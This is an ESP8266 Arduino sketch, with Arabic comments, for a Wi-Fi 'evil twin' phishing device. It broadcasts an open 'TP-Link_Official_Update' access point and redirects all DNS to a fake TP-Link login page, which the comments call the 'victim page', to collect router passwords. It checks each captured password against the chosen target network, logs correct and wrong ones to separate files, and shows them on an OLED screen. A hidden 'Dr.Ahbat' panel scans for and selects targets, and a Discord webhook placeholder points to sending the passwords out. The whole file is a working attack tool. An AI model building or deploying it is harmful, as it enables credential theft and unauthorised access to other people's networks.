#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
#include <WiFiClientSecure.h>
#include <LittleFS.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

// --- إعداداتك الخاصة ---
String target_ssid = "لم يحدد"; 
const char* discord_webhook = "ضع_رابط_الديسكورد_هنا";

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

const int BUTTON_PIN = 0; // زر BOOT
int menuIndex = 0;
bool wifiWantOn = false;

ESP8266WebServer webServer(80);
DNSServer dnsServer;

// --- 1. صفحة الضحية (TP-Link) ---
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TP-Link Wireless Router</title><style>
:root{--tp:#4acbd6;}body{font-family:sans-serif;margin:0;padding:0;text-align:center;background:#fff;}
header{background:#fff;padding:15px;border-bottom:1px solid #eee;text-align:left;}
.box{padding:40px 20px;max-width:350px;margin:auto;}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;}
.btn{width:100%;background:var(--tp);color:#white;border:none;padding:12px;border-radius:20px;font-weight:bold;cursor:pointer;}
.spin{width:30px;height:30px;border:3px solid #f3f3f3;border-top:3px solid var(--tp);border-radius:50%;animation:s 1s linear infinite;margin:20px auto;}
@keyframes s{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
</style></head><body><header><b style="font-size:20px">tp-link</b></header>
<div class="box" id="u"><p>Administrator password required for sync.</p>
<input type="password" id="p" placeholder="Password"><button class="btn" onclick="send()">Log In</button></div>
<div class="box" id="l" style="display:none"><div class="spin"></div><p>Synchronizing with router...</p></div>
<script>function send(){const p=document.getElementById('p').value;if(p.length<8)return;
fetch('/submit?pass='+encodeURIComponent(p));document.getElementById('u').style.display='none';document.getElementById('l').style.display='block';}</script>
</body></html>)rawliteral";

// --- 2. صفحة الإعدادات الاحترافية (Dr.Ahbat) ---
const char admin_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>body{font-family:sans-serif;background:#f0f2f5;margin:0;padding:0;text-align:center;}
.h{background:#4acbd6;color:white;padding:20px;} .c{padding:20px;max-width:400px;margin:auto;}
.card{background:white;padding:15px;border-radius:10px;margin-bottom:15px;box-shadow:0 2px 5px rgba(0,0,0,0.1);}
.btn{display:block;background:#2c3e50;color:white;padding:12px;text-decoration:none;border-radius:5px;margin-top:10px;}
.net-item{display:flex;justify-content:space-between;padding:10px;border-bottom:1px solid #eee;}</style>
</head><body><div class="h"><h1>Dr.Ahbat Panel</h1></div><div class="c">
<div class="card"><h3>الهدف الحالي:</h3><b style="color:#4acbd6" id="curr">...</b></div>
<a href="/scan" class="btn" style="background:#4acbd6">بحث عن شبكات (Scan)</a>
<div id="list" class="card" style="margin-top:20px;text-align:right">قائمة الشبكات ستظهر هنا بعد الفحص...</div>
</div></body></html>)rawliteral";

// --- نظام المطابقة الحقيقية ---
bool checkPass(String ssid, String pass) {
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("Verifying Pass...");
  display.println("Target: " + ssid);
  display.display();

  WiFi.begin(ssid.c_str(), pass.c_str());
  int count = 0;
  while (WiFi.status() != WL_CONNECTED && count < 20) {
    delay(500);
    count++;
  }
  bool ok = (WiFi.status() == WL_CONNECTED);
  WiFi.disconnect();
  return ok;
}

void updateWiFi() {
  WiFi.softAPdisconnect(true);
  if (wifiWantOn) WiFi.softAP("Dr.Ahbat", "123456789");
  else WiFi.softAP("TP-Link_Official_Update");
}

void setup() {
  Serial.begin(115200);
  LittleFS.begin();
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.setTextColor(WHITE);
  updateWiFi();
  dnsServer.start(53, "*", IPAddress(192,168,4,1));

  webServer.on("/", []() {
    if (wifiWantOn) webServer.send(200, "text/html", admin_html);
    else webServer.send(200, "text/html", index_html);
  });

  webServer.on("/scan", []() {
    int n = WiFi.scanNetworks();
    String h = "<h3>الشبكات المكتشفة:</h3>";
    for(int i=0; i<n; i++) h += "<div class='net-item'><a href='/set?s="+WiFi.SSID(i)+"'>"+WiFi.SSID(i)+"</a><span>"+String(WiFi.RSSI(i))+"dBm</span></div>";
    webServer.send(200, "text/html", h + "<br><a href='/'>رجوع</a>");
  });

  webServer.on("/set", []() {
    target_ssid = webServer.arg("s");
    webServer.send(200, "text/html", "<h2>تم اختيار: "+target_ssid+"</h2><a href='/'>رجوع للوحة التحكم</a>");
  });

  webServer.on("/submit", handleCapture);
  webServer.begin();
}

void handleCapture() {
  String p = webServer.arg("pass");
  bool ok = checkPass(target_ssid, p);
  updateWiFi();
  
  display.clearDisplay();
  display.setCursor(0,0);
  display.println(ok ? "CORRECT!" : "WRONG PASS");
  display.println("Pass: " + p);
  display.display();

  File f = LittleFS.open(ok ? "/SUCCESS.txt" : "/FAKE.txt", "a");
  f.println(p); f.close();
  
  webServer.send(200, "text/plain", "OK");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (digitalRead(BUTTON_PIN) == LOW) {
    unsigned long st = millis();
    while(digitalRead(BUTTON_PIN) == LOW);
    if (millis() - st > 2000) {
      wifiWantOn = !wifiWantOn;
      updateWiFi();
      display.clearDisplay();
      display.setCursor(0,0);
      display.println("Mode Switched!");
      display.println(wifiWantOn ? "DR.AHBAT ON" : "HUNTING ON");
      display.display();
    }
  }
}
